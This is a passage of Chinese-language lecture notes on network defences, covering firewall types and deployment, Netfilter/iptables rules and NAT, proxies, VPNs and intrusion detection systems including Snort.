不足</h4><ul><li><p>作为网络边界防护机制而先天无法防范的安全威胁</p><p>–来自网络内部的安全威胁</p><p>–通过非法外联的网络攻击</p><p>–计算机病毒传播</p></li><li><p>由于技术瓶颈问题目前还无法有效防范的安全威胁</p><p>–针对开放服务安全漏洞的渗透攻击</p><p>–针对网络客户端程序的渗透攻击</p><p>–基于隐蔽通道进行通信的特洛伊木马或僵尸网络</p></li></ul><h4 id="13-2-1-4-防火墙技术类型"><a href="#13-2-1-4-防火墙技术类型" class="headerlink" title="13.2.1.4 防火墙技术类型"></a>13.2.1.4 防火墙技术类型</h4><ul><li><p>包过滤防火墙(packet filter)</p><p>–1988, DEC</p><p>–网络包粒度, 工作在网络层, 主要实现形式为路由器ACL</p></li><li><p>状态防火墙(stateful firewall)</p><p>–1980s底, AT&amp;T Bell</p><p>–网络会话粒度,工作在传输层</p><p>–目前防火墙最主要实现方式</p></li><li><p>电路级代理技术</p></li><li><p>应用层代理防火墙(application layer firewall)</p><p>–Paper: 1990 Purdue, AT&amp;T</p><p>–Product: 1991 DEC</p><p>–应用层代理，工作在应用层</p></li></ul><h5 id="13-2-1-4-1-包过滤防火墙"><a href="#13-2-1-4-1-包过滤防火墙" class="headerlink" title="13.2.1.4.1 包过滤防火墙"></a>13.2.1.4.1 包过滤防火墙</h5><ul><li><p>基本的思想很简单</p><p>–对于每个进来的包，适用一组规则，然后决定转发或者丢弃该包</p><p>–往往配置成双向的</p></li><li><p>如何过滤</p><p>–过滤的规则以IP和传输层的头中的域(字段)为基础，包括源和目标IP地址、IP协议域、源和目标端口号</p><p>–过滤器往往建立一组规则，根据IP包是否匹配规则中指定的条件来作出决定。</p><p>–如果匹配到一条规则，则根据此规则决定转发或者丢弃</p><p>–如果所有规则都不匹配，则根据缺省策略</p></li><li><p>根据定义好的过滤规则审查每个数据包，过滤规则基于数据包的报头信息进行制订。</p></li><li><p>报头信息中包括IP源地址、IP目标地址、传输协议(TCP、UDP、ICMP等等)、TCP/UDP目标端口、ICMP消息类型等</p></li></ul><ul><li><p>通常在路由器上实现</p><p>–实际上是一种网络层的访问控制机制</p><p>–路由器ACL机制</p></li><li><p>在网络层上进行监测</p><p>–仅仅根据数据包自身包含的信息(协议头部)进行检查和过滤</p><p>–并没有考虑连接状态信息</p></li><li><p>优点：</p><p>–实现简单</p><p>–对用户透明</p><p>–效率高</p></li><li><p>缺点：</p><p>–正确制定规则并不容易</p><p>–不可能引入认证机制</p></li></ul><h5 id="13-2-1-4-2-状态防火墙"><a href="#13-2-1-4-2-状态防火墙" class="headerlink" title="13.2.1.4.2 状态防火墙"></a>13.2.1.4.2 状态防火墙</h5><ul><li><p>状态防火墙</p><p>–跟踪网络会话(连接)状态, 判断报文合法性</p><p>–在网络会话粒度上匹配和实施防火墙规则</p><p>–特性: 状态报文检查(SPI: stateful packet inspection)</p></li></ul><ul><li><p>状态防火墙机制</p><p>–跟踪和维护网络连接状态信息(CT: connection table)</p><p>–TCP网络连接</p><ul><li>SYN包: NEW connections</li><li>经过三次握手: ESTABLISHED connections</li></ul><p>–UDP会话</p><ul><li>一般处理UDP包时, 马上设置为ESTABLISHED</li></ul><p>–在网络访问配置规则中支持对状态的匹配</p></li><li><p>目前防火墙产品的主流应用技术</p><p>–国外厂商: Check Point/Cisco/ FORTINET/Juniper…</p><p>–国内厂商: 天融信/联想/方正/…</p><p>–开源软件: Netfilter*/IPTables* (Linux)</p></li></ul><h4 id="13-2-1-5-防火墙产品"><a href="#13-2-1-5-防火墙产品" class="headerlink" title="13.2.1.5 防火墙产品"></a>13.2.1.5 防火墙产品</h4><ul><li><p>防火墙产品类别</p><p>–集成包过滤功能的路由器</p><p>–基于通用操作系统的防火墙软件产品</p><p>–软件防火墙</p><p>–基于安全操作系统的防火墙</p><p>–软件防火墙+硬件Box</p><p>–硬件防火墙设备</p><p>–硬件防火墙</p></li><li><p>个人防火墙</p><p>–Windows个人防火墙</p><p>–天网防火墙</p><p>–360安全卫士/瑞星</p></li></ul><h4 id="13-2-1-6-防火墙部署方法"><a href="#13-2-1-6-防火墙部署方法" class="headerlink" title="13.2.1.6 防火墙部署方法"></a>13.2.1.6 防火墙部署方法</h4><ul><li><p>包过滤路由器</p></li><li><p>双宿主堡垒主机</p></li><li><p>屏蔽主机</p></li><li><p>屏蔽子网</p></li><li><p>几个基本概念</p><p>–堡垒主机(Bastion Host)：对外部网络暴露，同时也是内部网络用户的主要连接点</p><p>–双宿主主机(dual-homed host)：至少有两个网络接口的通用计算机系统</p><p>–DMZ(Demilitarized Zone，非军事区或者停火区)：在内部网络和外部网络之间增加的一个子网</p></li></ul><h5 id="13-2-1-6-1-包过滤路由器部署方案"><a href="#13-2-1-6-1-包过滤路由器部署方案" class="headerlink" title="13.2.1.6.1 包过滤路由器部署方案"></a>13.2.1.6.1 包过滤路由器部署方案</h5><ul><li><p>包过滤防火墙功能的路由器</p><p>–内部网络和外部网络之间的唯一连接点</p><p>–路由+ACL</p></li><li><p>优势</p><p>–成本低、易于使用</p></li><li><p>缺点</p><p>–一旦路由器被攻破，内网完全暴露</p><p>–内部网络信息对外公开，可攻击开放的主机和服务</p></li></ul><h5 id="13-2-1-6-2-双宿主堡垒主机部署方案"><a href="#13-2-1-6-2-双宿主堡垒主机部署方案" class="headerlink" title="13.2.1.6.2 双宿主堡垒主机部署方案"></a>13.2.1.6.2 双宿主堡垒主机部署方案</h5><ul><li><p>使用应用代理网关作为双宿主堡垒主机</p><p>–一个使用公网IP地址连接外部网络</p><p>–一个使用私有IP地址连接内部网络</p><p>–由应用代理服务器程序为特定的网络应用提供代理</p></li><li><p>优点：对外屏蔽内网信息、用户级身份认证和行为审计</p></li><li><p>缺点：内网对外访问控制过于严格、堡垒主机安全差、，一旦堡垒主机被攻破，内网也将全面地暴露</p></li></ul><h5 id="13-2-1-6-3-屏蔽主机"><a href="#13-2-1-6-3-屏蔽主机" class="headerlink" title="13.2.1.6.3 屏蔽主机"></a>13.2.1.6.3 屏蔽主机</h5><ul><li><p>结合包过滤防火墙和应用层代理</p><p>–两层安全防护</p><p>–包过滤防火墙：网络层的访问控制</p><p>–应用层代理堡垒主机：进行应用安全控制</p></li><li><p>优势：双重安全可靠设计</p></li><li><p>缺点：对外开放服务器成弱点</p></li></ul><h5 id="13-2-1-6-4-屏蔽子网"><a href="#13-2-1-6-4-屏蔽子网" class="headerlink" title="13.2.1.6.4 屏蔽子网"></a>13.2.1.6.4 屏蔽子网</h5><ul><li><p>屏蔽子网：DMZ区</p><p>–应用代理及对外服务器</p><p>–三层安全防护：外网防火墙、应用层代理、内网防火墙</p></li></ul><h4 id="13-2-1-7-Linux中的开源防火墙"><a href="#13-2-1-7-Linux中的开源防火墙" class="headerlink" title="13.2.1.7 Linux中的开源防火墙"></a>13.2.1.7 Linux中的开源防火墙</h4><ul><li><p>Netfilter</p><p>–Linux内核中的防火墙模块</p><p>–Netfilter特性</p><ul><li>包过滤-&gt;状态报文检查</li><li>灵活可扩展框架, 支持NAT网络地址转换, 提供多层API接口以支持第三方扩展</li></ul><p>–Netfilter功能</p><ul><li>构建防火墙, NAT共享上网, 利用NAT构建透明代理, 构建QoS或策略路由器, …</li></ul></li><li><p>IPTables</p><p>–Linux应用层的防火墙配置工具</p><p>–ipfwadm(2.0.x) -&gt; ipchains(2.2.x) -&gt; iptables(2.4.x/2.6.x)</p></li></ul><h5 id="13-2-1-7-1-Netfilter-iptables的缺省规则表-链"><a href="#13-2-1-7-1-Netfilter-iptables的缺省规则表-链" class="headerlink" title="13.2.1.7.1 Netfilter/iptables的缺省规则表/链"></a>13.2.1.7.1 Netfilter/iptables的缺省规则表/链</h5><h5 id="13-2-1-7-2-Netfilter在Linux协议栈中的hook检查点"><a href="#13-2-1-7-2-Netfilter在Linux协议栈中的hook检查点" class="headerlink" title="13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点"></a>13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点</h5><ul><li>PREROUTING: 进入防火墙数据包, 路由转发前, 实现NAPT/DNAT</li><li>LOCAL INPUT: 发往本地协议栈的数据包, 实现本地安全防护</li><li>FORWARD: 经过防火墙转发的数据包, 实现网络流状态过滤</li><li>LOCAL OUTPUT: 从本地协议栈发出的数据包, 限制对外访问</li><li>POSTROUTING: 从防火墙发出数据包, 路由转发后, 实现SNAT</li></ul><h5 id="13-2-1-7-3-Netfilter的检查链和处理策略"><a href="#13-2-1-7-3-Netfilter的检查链和处理策略" class="headerlink" title="13.2.1.7.3 Netfilter的检查链和处理策略"></a>13.2.1.7.3 Netfilter的检查链和处理策略</h5><ul><li><p>Netfilter检查链</p><p>–通过防火墙转发流量: PREROUTINGàFORWARDàPOSTROUTING</p><p>–传入防火墙本机流量: PREROUTINGàINPUT</p><p>–防火墙本机传出流量: OUTPUTàPOSTROUTING</p></li><li><p>Netfilter处理策略</p><p>–ACCEPT: 允许数据包经过网络协议栈</p><p>–DROP: 静默地丢弃数据包</p><p>–QUEUE: 通过nf_queue机制将数据包传送至应用层供上层应用处理</p><p>–STOLEN: 保持数据包直到特定条件后处理, 用于处理IP分片等</p><p>–REPEAT: 使得数据包重新进入hook点</p></li></ul><h5 id="13-2-1-7-4-Netfilter的报文状态检查"><a href="#13-2-1-7-4-Netfilter的报文状态检查" class="headerlink" title="13.2.1.7.4 Netfilter的报文状态检查"></a>13.2.1.7.4 Netfilter的报文状态检查</h5><ul><li><p>支持的网络连接状态</p><p>–NEW: 新建连接, 连接初始报文或只看到一个方向的数据包</p><p>–ESTABLISHED: 已建连接, 双向通讯</p><p>–RELATED: 相关连接, 用于处理FTP等协商端口的网络协议</p><p>–INVALD: 非法状态</p></li><li><p>实现机制</p><p>–使用hash表等实现CT表, 支持对已记录连接的快速查找</p><p>–在PREROUTING, INPUT, POSTROUTING等hook点上注册callback函数, 用于跟踪网络连接状态</p><p>–支持用户态程序(IPTables)灵活配置各个hook点上的防火墙规则, 对网络连接进行访问控制</p></li></ul><h5 id="13-2-1-7-5-Netfilter防火墙规则过滤"><a href="#13-2-1-7-5-Netfilter防火墙规则过滤" class="headerlink" title="13.2.1.7.5 Netfilter防火墙规则过滤"></a>13.2.1.7.5 Netfilter防火墙规则过滤</h5><h5 id="13-2-1-7-6-Iptables"><a href="#13-2-1-7-6-Iptables" class="headerlink" title="13.2.1.7.6 Iptables"></a>13.2.1.7.6 Iptables</h5><ul><li><p>为用户提供了配置netfilter规则的命令行接口</p><p>–$ iptables[-t table] command [match] [target]</p></li><li><p>command-规则配置动作</p><p>–-A(添加)、-D(删除)、-P(缺省策略)、-N(新建链)、-F(清空)、-L(列举)</p></li><li><p>match-规则匹配条件</p><p>–通用匹配和特定协议匹配</p><p>–支持“与”关系</p></li><li><p>Target-目标操作</p><p>–ACCEPT、DROP、REJECT、RETURN</p></li></ul><h5 id="13-2-1-7-7-Netfilter-iptables的过滤与报文状态检查机制"><a href="#13-2-1-7-7-Netfilter-iptables的过滤与报文状态检查机制" class="headerlink" title="13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制"></a>13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制</h5><ul><li><p>两种策略</p><p>(1) 设置缺省的通行策略为允许(ACCEPT)，然后定义禁止的网络流量和行为；-Bad</p><p>(2) 设置缺省的通行策略为禁止(DROP)，然后定义允许的网络流量和行为；-Good</p></li><li><p>静态包过滤</p><p>–# iptables-t filter -A FORWARD -s 192.168.0.0/24 -d 192.168.1.0/24 -j ACCEPT</p></li><li><p>报文状态检查</p><p>–状态：NEW、ESTABLISHED、RELATED、INVALD</p><p>–# iptables-t filter -A FORWARD -d [WEB_SERVER] -m state —state NEW -j ACCEPT</p><p>–# iptables-t filter -A FORWARD -m state —state RELATED,ESTABLISHED -j ACCEPT</p></li></ul><h5 id="13-2-1-7-8-Netfilter-iptables的NAT机制"><a href="#13-2-1-7-8-Netfilter-iptables的NAT机制" class="headerlink" title="13.2.1.7.8 Netfilter/iptables的NAT机制"></a>13.2.1.7.8 Netfilter/iptables的NAT机制</h5><ul><li><p>NAT机制类型</p><p>–SNAT：源地址/端口NAT</p><p>–DNAT：目的地址/端口NAT</p></li><li><p>NAT功能类型</p><p>–IP伪装（masquerading）：属于SNAT</p><ul><li><h1 id="iptables-t-nat-A-POSTROUTING-ieth1-o-eth0-j-MASQUERADE"><a href="#iptables-t-nat-A-POSTROUTING-ieth1-o-eth0-j-MASQUERADE" class="headerlink" title="iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE"></a>iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE</h1></li></ul><p>–透明代理（transparent proxying）：属于DNAT</p><ul><li><h1 id="iptables-t-nat-A-PREROUTING-ieth1-j-DNAT-—to-5-6-7-8"><a href="#iptables-t-nat-A-PREROUTING-ieth1-j-DNAT-—to-5-6-7-8" class="headerlink" title="iptables-t nat-A PREROUTING -ieth1 -j DNAT —to 5.6.7.8"></a>iptables-t nat-A PREROUTING -ieth1 -j DNAT —to 5.6.7.8</h1></li></ul><p>–端口转发（port forwarding）</p><ul><li><h1 id="iptables-A-PREROUTING-t-nat-p-tcp-d-1-2-3-4-—dport8080-j-DNAT-—to-192-168-1-1-80"><a href="#iptables-A-PREROUTING-t-nat-p-tcp-d-1-2-3-4-—dport8080-j-DNAT-—to-192-168-1-1-80" class="headerlink" title="iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 —dport8080 -j DNAT —to 192.168.1.1:80"></a>iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 —dport8080 -j DNAT —to 192.168.1.1:80</h1></li></ul></li></ul><h3 id="13-2-2-代理技术"><a href="#13-2-2-代理技术" class="headerlink" title="13.2.2 代理技术"></a>13.2.2 代理技术</h3><ul><li><p>代理(proxy)实际上也是一种安全防护技术</p><p>–允许客户端通过代理与网络服务进行非直接的连接</p><p>–在代理服务器上可以进行访问控制和内容检查</p></li><li><p>不同类型的代理技术</p><p>–应用层：应用层代理(HTTP代理)</p><p>–传输层：电路级代理(Socks代理)</p><p>–网络层：NAT代理(NAT网关、拨号上网路由器)</p></li></ul><h4 id="13-2-2-1-应用层代理"><a href="#13-2-2-1-应用层代理" class="headerlink" title="13.2.2.1 应用层代理"></a>13.2.2.1 应用层代理</h4><ul><li><p>应用层代理</p><p>–也称为应用层网关、代理服务器</p><p>–特定应用层网络服务(HTTP/Email…)</p><p>–MSP –Microsoft Proxy Server、Squid</p></li></ul><ul><li><p>应用层代理优势</p><p>–隐藏内部网络信息</p><p>–通讯中转，严格内容审查</p><p>–存储转发机制，在线审计</p><p>–用户级身份认证机制</p></li><li><p>应用层代理不足</p><p>–不通用、不透明、处理速度较慢、部署代价较高</p></li></ul><h4 id="13-2-2-2-电路级代理"><a href="#13-2-2-2-电路级代理" class="headerlink" title="13.2.2.2 电路级代理"></a>13.2.2.2 电路级代理</h4><ul><li><p>电路级代理</p><p>–Socks代理</p><p>–工作在传输层</p><p>–同时为多种不同的应用服务提供支持</p></li><li><p>工作机制</p><p>–TCP层中继</p><p>–建立外部连接，并在连接会话间转发数据</p></li><li><p>差异：通用、用户级身份认证，但无法进行细致内容审查</p></li></ul><h4 id="13-2-2-3-NAT代理-网络地址转换"><a href="#13-2-2-3-NAT代理-网络地址转换" class="headerlink" title="13.2.2.3 NAT代理-网络地址转换"></a>13.2.2.3 NAT代理-网络地址转换</h4><ul><li><p>NAT(网络地址转换)</p><p>–允许多个用户分享少量或单一的IP地址（源NAT）</p><p>–允许将网络服务映射到内部服务网络IP和端口（目的NAT）</p></li><li><p>NAT代理优势</p><p>–方便：任意使用私有网段IP地址，无需申请，无冲突</p><p>–安全：对外隐藏内部网络信息</p></li></ul><h3 id="13-2-3-VPN"><a href="#13-2-3-VPN" class="headerlink" title="13.2.3 VPN"></a>13.2.3 VPN</h3><ul><li><p>VPN－虚拟专有网(Virtual Private Network)</p><p>–利用大规模网络(如Internet)上公用链路代替物理链路构建的安全专有网络。</p><p>–大型跨地域企业构建企业网的常用方案。</p></li><li><p>VPN类型</p><p>–IPSEC VPN(网络层)</p><p>–SSL VPN(传输层)</p></li><li><p>VPN产品</p><p>–国内通常在防火墙上集成</p><p>–专用VPN设备</p></li><li><p>开源VPNOpenVPN</p></li></ul><h3 id="13-2-4-内网安全管理"><a href="#13-2-4-内网安全管理" class="headerlink" title="13.2.4 内网安全管理"></a>13.2.4 内网安全管理</h3><ul><li><p>70%以上安全事故是由网络内部原因造成的</p><p>–防火墙等边界安全防护不能应对</p><p>–内网安全管理的必要性</p></li><li><p>内网安全管理</p><p>–有效地对内网终端进行安全管理和健康状态监控，从而增强内部网络的安全性</p><p>–终端安全管理</p><p>–终端运维管理</p><p>–终端补丁分发管理</p><p>–系统日志管理</p></li></ul><h3 id="13-2-5-内容安全管理-SCM"><a href="#13-2-5-内容安全管理-SCM" class="headerlink" title="13.2.5 内容安全管理(SCM)"></a>13.2.5 内容安全管理(SCM)</h3><ul><li><p>内容安全管理SCM</p><p>–关注对网络传输内容的安全性检查</p></li><li><p>网络行为监控</p><p>–网络行为监控审计</p><p>–绿色上网</p></li><li><p>防虫墙/防病毒网关</p><p>–防病毒、蠕虫网关</p></li><li><p>垃圾邮件过滤网关</p></li></ul><h3 id="13-2-6-边界安全防御发展趋势-UTM-amp-高性能"><a href="#13-2-6-边界安全防御发展趋势-UTM-amp-高性能" class="headerlink" title="13.2.6 边界安全防御发展趋势-UTM&amp;高性能"></a>13.2.6 边界安全防御发展趋势-UTM&amp;高性能</h3><ul><li><p>“胖”防火墙 转化为 UTM</p></li><li><p>UTM－统一威胁管理</p></li><li><p>Many features in one box</p><p>–网络访问与控制: 防火墙, …</p><p>–加密与身份认证: VPN, …</p><p>–SCM: 垃圾邮件过滤, 防病毒, IDS/IPS, 上网监管, …</p></li></ul><h2 id="13-3-D：检测技术"><a href="#13-3-D：检测技术" class="headerlink" title="13.3 D：检测技术"></a>13.3 D：检测技术</h2><h3 id="13-3-1-入侵检测系统基本概念"><a href="#13-3-1-入侵检测系统基本概念" class="headerlink" title="13.3.1 入侵检测系统基本概念"></a>13.3.1 入侵检测系统基本概念</h3><ul><li><p>入侵检测(Intrusion Detection)</p><p>–入侵检测，顾名思义，就是对入侵行为的检测与发现。</p><p>–入侵检测即为通过对计算机网络或计算机系统中若干关键点信息的收集和分析，从中发现入侵行为的一种安全技术。</p></li><li><p>入侵(Intrusion)</p><p>–一次入侵可被定义为任何尝试破坏信息资源的保密性、完整性或可用性的行为。</p></li><li><p>入侵检测系统(Intrusion Detection System)</p><p>–实现入侵检测技术，专门用于入侵行为发现和处理的软件系统或硬件设备。</p></li><li><p>防火墙VS IDS：门卫 VS 巡逻队</p></li></ul><h3 id="13-3-2-入侵检测技术的发展历程"><a href="#13-3-2-入侵检测技术的发展历程" class="headerlink" title="13.3.2 入侵检测技术的发展历程"></a>13.3.2 入侵检测技术的发展历程</h3><h4 id="13-3-2-1-Denning入侵检测模型"><a href="#13-3-2-1-Denning入侵检测模型" class="headerlink" title="13.3.2.1 Denning入侵检测模型"></a>13.3.2.1 Denning入侵检测模型</h4><h4 id="13-3-2-2-为什么Gartner说IDS已死"><a href="#13-3-2-2-为什么Gartner说IDS已死" class="headerlink" title="13.3.2.2 为什么Gartner说IDS已死"></a>13.3.2.2 为什么Gartner说IDS已死</h4><ul><li><p>入侵检测产品的误报、漏报和对攻击行为缺乏实时响应等问题突出，严重影响了产品发挥实际的作用。</p></li><li><p>Gartner认为IDS不能给网络带来附加的安全，反而会增加管理员的困扰，建议用户使用入侵防御系统(Intrusion Prevention System)即IPS来代替IDS。</p></li><li><p>Gartner认为只有在线的或基于主机的攻击阻止(实时拦截)才是最有效的入侵防御系统。</p></li></ul><h4 id="13-3-2-3-入侵威胁分类图"><a href="#13-3-2-3-入侵威胁分类图" class="headerlink" title="13.3.2.3 入侵威胁分类图"></a>13.3.2.3 入侵威胁分类图</h4><ul><li><p>入侵者分类</p><p>–外部渗透者: 攻破外部访问控制</p><p>–内部渗透者: 假冒者(攻破过程控制),违法者(误用访问), 秘密用户(攻破逻辑控制)</p></li><li><p>检测分析模型</p><p>–误用检测：监视违反特定规则的权限误用行为，违法者检测</p><p>–异常检测：基于统计方法建立用户正常行为轮廓，假冒者检测</p></li></ul><h4 id="13-3-2-4-入侵检测抽象理论模型"><a href="#13-3-2-4-入侵检测抽象理论模型" class="headerlink" title="13.3.2.4 入侵检测抽象理论模型"></a>13.3.2.4 入侵检测抽象理论模型</h4><h4 id="13-3-2-5-通用入侵检测模型-CIDF"><a href="#13-3-2-5-通用入侵检测模型-CIDF" class="headerlink" title="13.3.2.5 通用入侵检测模型(CIDF)"></a>13.3.2.5 通用入侵检测模型(CIDF)</h4><p>CIDF（Common Intrusion Detection Framework，通用入侵检测模型）定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议。符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略。</p><p>CIDF将一个入侵检测系统分为以下组件：</p><ul><li>事件产生器（Event generators）：从入侵检测系统外的整个计算环境中获得事件，并以CIDF gidos格式向系统的其他部分提供此事件。事件产生器是所有IDS所需要的，同时也是可以重用的。</li><li>事件分析器（Event analyzers）：从其他组件接收gidos，分析得到的数据，并产生新的gidos。如分析器可以是一个轮廓特征引擎。</li><li>响应单元（Response units ）：是对分析结果作出作出反应的功能单元，它可以终止进程、重置连接、改变文件属性等，也可以只是简单的报警。</li><li>事件数据库（Event databases）：是存放各种中间和最终数据的地方的统称，它可以是复杂的数据库，也可以是简单的文本文件。</li></ul><h4 id="13-3-2-6-入侵检测技术评估指标"><a href="#13-3-2-6-入侵检测技术评估指标" class="headerlink" title="13.3.2.6 入侵检测技术评估指标"></a>13.3.2.6 入侵检测技术评估指标</h4><ul><li><p>检测率(True Positive)</p><p>–攻击事件的检出效果：检测出攻击事件数和全部攻击数之比</p><p>–漏报率(false negative) : 攻击事件没有被检测到</p></li><li><p>误报率(False Positive)</p><p>–把正常事件识别为攻击并报警</p></li><li><p>检测率和误报率往往不能同时很好</p><p>–“基调悖论(base-rate fallacy)”</p><p>–实际的IDS的实现总是在检测率和虚警率之间徘徊，检测率高了，虚警率就会提高;同样虚警率降低了，检测率也就会降低。一般地，IDS产品会在两者中取一个折衷，并且能够进行调整，以适应不同的网络环境。</p></li></ul><h4 id="13-3-2-7-IDS准确率评判标准-ROC曲线"><a href="#13-3-2-7-IDS准确率评判标准-ROC曲线" class="headerlink" title="13.3.2.7 IDS准确率评判标准: ROC曲线"></a>13.3.2.7 IDS准确率评判标准: ROC曲线</h4><ul><li><p>对比ROC曲线所围成的面积</p></li><li><p>林肯实验室用接收器特性(ROC，Receiver Operating Characteristic)曲线来描述IDS的性能。</p><p>–ROC广泛用于输入不确定的系统的评估。</p><p>–该曲线可以刻画了IDS的检测率与误报率之间的变化关系。</p></li><li><p>根据一个IDS在不同的条件(在允许范围内变化的阈值，例如异常检测系统的报警门限等参数)下的误报率和检测率，分别把误报率和检测率作为横坐标和纵坐标，就可做出对应于该IDS的ROC曲线。</p></li></ul><p>如果一条直线向上，然后向右以45度角延伸，就是一个非常失败的IDS，它毫无用处；相反，ROC曲线下方的区域越大，IDS的准确率越高。</p><p>如图所示，IDS B的准确性高于IDS C，类似地，IDS A在所有的IDS中具有最高的准确性。</p><h3 id="13-3-3-入侵检测技术"><a href="#13-3-3-入侵检测技术" class="headerlink" title="13.3.3 入侵检测技术"></a>13.3.3 入侵检测技术</h3><ul><li><p>误用检测(misuse detection)</p><p>–也称为基于特征的检测(signature-based detection)</p><p>–建立起已知攻击的特征库</p><p>–判别当前行为活动是否符合已知的攻击特征</p></li><li><p>异常检测(anomaly detection)</p><p>–也称为基于行为的检测(behavior-based detection)</p><p>–首先建立起系统的正常模式轮廓</p><p>–若实时获得的系统或用户的轮廓值与正常值的差异超出指定的阈值，就进行入侵报警</p></li></ul><h4 id="13-3-3-1-误用检测"><a href="#13-3-3-1-误用检测" class="headerlink" title="13.3.3.1 误用检测"></a>13.3.3.1 误用检测</h4><ul><li><p>目前研究工作比较多，并且已经进入实用</p><p>–建立起已有攻击的模式特征库</p><p>–难点在于：如何做到动态更新，自适应</p></li><li><p>常用技术</p><p>–基于简单规则的模式匹配技术</p><p>–基于专家系统的检测技术</p><p>–基于状态转换分析的检测技术</p></li><li><p>攻击特征提取</p><p>–专家提取</p><p>–自动提取方法(研究热点)</p></li></ul><h5 id="13-3-3-1-1-IDA工作原理——模式匹配"><a href="#13-3-3-1-1-IDA工作原理——模式匹配" class="headerlink" title="13.3.3.1.1 IDA工作原理——模式匹配"></a>13.3.3.1.1 IDA工作原理——模式匹配</h5><ul><li><p>单模式匹配</p><p>–KMP算法  Knuth-Morris-Pratt</p><p>–BM算法   Boyer-Moore</p></li><li><p>多模式匹配</p><p>–AC算法  Aho-Corasick</p><p>–基于FSA(有限状态机)，对文本串扫描一次就可以找出匹配的所有模式</p></li></ul><h5 id="13-3-3-1-2-正则表达式的匹配"><a href="#13-3-3-1-2-正则表达式的匹配" class="headerlink" title="13.3.3.1.2 正则表达式的匹配"></a>13.3.3.1.2 正则表达式的匹配</h5><ul><li><p>正则表达式能够用来描述符合某类句法规则的字符串集，支持描述更为广泛的负载特征，这使得其能够广泛应用于入侵检测/入侵防御、病毒检测、协议识别等系统中。</p></li><li><p>构造正则表达式对应的自动机来解决正则表达式的匹配问题是流行的技术解决手段</p><p>–基于NFA的技术易于实现，占用状态存储空间较少，但匹配速度较慢。</p><p>–基于DFA的技术具有较快的匹配速度，但会引发状态数量呈指数增加。</p></li></ul><h4 id="13-3-3-2-异常检测"><a href="#13-3-3-2-异常检测" class="headerlink" title="13.3.3.2 异常检测"></a>13.3.3.2 异常检测</h4><ul><li><p>比较符合安全的概念，但是实现难度较大</p><p>–正常模式的知识库难以建立</p><p>–难以明确划分正常模式和异常模式</p></li><li><p>常用技术</p><p>–统计方法</p><p>–预测模式</p><p>–神经网络</p></li></ul><h3 id="13-3-4-入侵检测系统的分类与部署"><a href="#13-3-4-入侵检测系统的分类与部署" class="headerlink" title="13.3.4 入侵检测系统的分类与部署"></a>13.3.4 入侵检测系统的分类与部署</h3><h4 id="13-3-4-1-基于网络的入侵检测系统-NIDS"><a href="#13-3-4-1-基于网络的入侵检测系统-NIDS" class="headerlink" title="13.3.4.1 基于网络的入侵检测系统(NIDS)"></a>13.3.4.1 基于网络的入侵检测系统(NIDS)</h4><p>IDS可以放在防火墙或者网关的后面，以网络嗅探器的形式捕获所有的对内对外的数据包。</p><h4 id="13-3-4-2-基于审计的入侵检测系统-HIDS"><a href="#13-3-4-2-基于审计的入侵检测系统-HIDS" class="headerlink" title="13.3.4.2 基于审计的入侵检测系统(HIDS)"></a>13.3.4.2 基于审计的入侵检测系统(HIDS)</h4><ul><li><p>安全操作系统必须具备一定的审计功能，并记录相应的安全性日志</p></li><li><p>基于内核</p><p>从操作系统的内核接收数据</p></li><li><p>基于应用</p><p>从正在运行的应用程序中收集数据</p></li></ul><h4 id="13-3-4-3-分布式入侵检测系统-DIDS"><a href="#13-3-4-3-分布式入侵检测系统-DIDS" class="headerlink" title="13.3.4.3 分布式入侵检测系统(DIDS)"></a>13.3.4.3 分布式入侵检测系统(DIDS)</h4><h4 id="13-3-4-4-入侵检测系统的部署位置"><a href="#13-3-4-4-入侵检测系统的部署位置" class="headerlink" title="13.3.4.4 入侵检测系统的部署位置"></a>13.3.4.4 入侵检测系统的部署位置</h4><ul><li><p>当实际使用检测系统时，首先面临的问题就是决定应该在系统的什么位置安装检测和分析入侵行为用的感应器Sensor或检测引擎Engine。</p><p>–对于基于主机的IDS，一般来说直接将检测代理安装在受监控的主机系统上。</p><p>–对于基于网络的IDS，情况稍微复杂</p></li><li><p>IDS布局</p></li></ul><h3 id="13-3-5-入侵防御系统IPS"><a href="#13-3-5-入侵防御系统IPS" class="headerlink" title="13.3.5 入侵防御系统IPS"></a>13.3.5 入侵防御系统IPS</h3><ul><li><p>IDS与IPS</p><p>–IDS: 旁路监听，只起到Detection机制</p><p>–侧重低漏报率，造成误报率较高</p><p>–对使用者技术水平要求较高，应急响应及时</p></li><li><p>IPS:内联模式，实时处置数据包</p><p>–侧重低误报率（对正常业务不造成影响）</p><p>–高效的处理性能</p><p>–即插即用，无需使用者参与</p></li></ul><h3 id="13-3-6-著名的开源入侵检测系统-Snort"><a href="#13-3-6-著名的开源入侵检测系统-Snort" class="headerlink" title="13.3.6 著名的开源入侵检测系统-Snort"></a>13.3.6 著名的开源入侵检测系统-Snort</h3><h4 id="13-3-6-1-Snort概述"><a href="#13-3-6-1-Snort概述" class="headerlink" title="13.3.6.1 Snort概述"></a>13.3.6.1 Snort概述</h4><p>Snort是一个轻量级网络入侵检测系统，具有实时数据流分析和日志IP 网络数据包的功能，能够进行协议分析和内容搜索匹配，能够检测不同的攻击方式并对攻击进行实时报警。此外Snort 是一个跨平台、开放源代码的免费软件，所以Snort还具有很好的扩展性和可移植性。</p><h4 id="13-3-6-2-Snort结构"><a href="#13-3-6-2-Snort结构" class="headerlink" title="13.3.6.2 Snort结构"></a>13.3.6.2 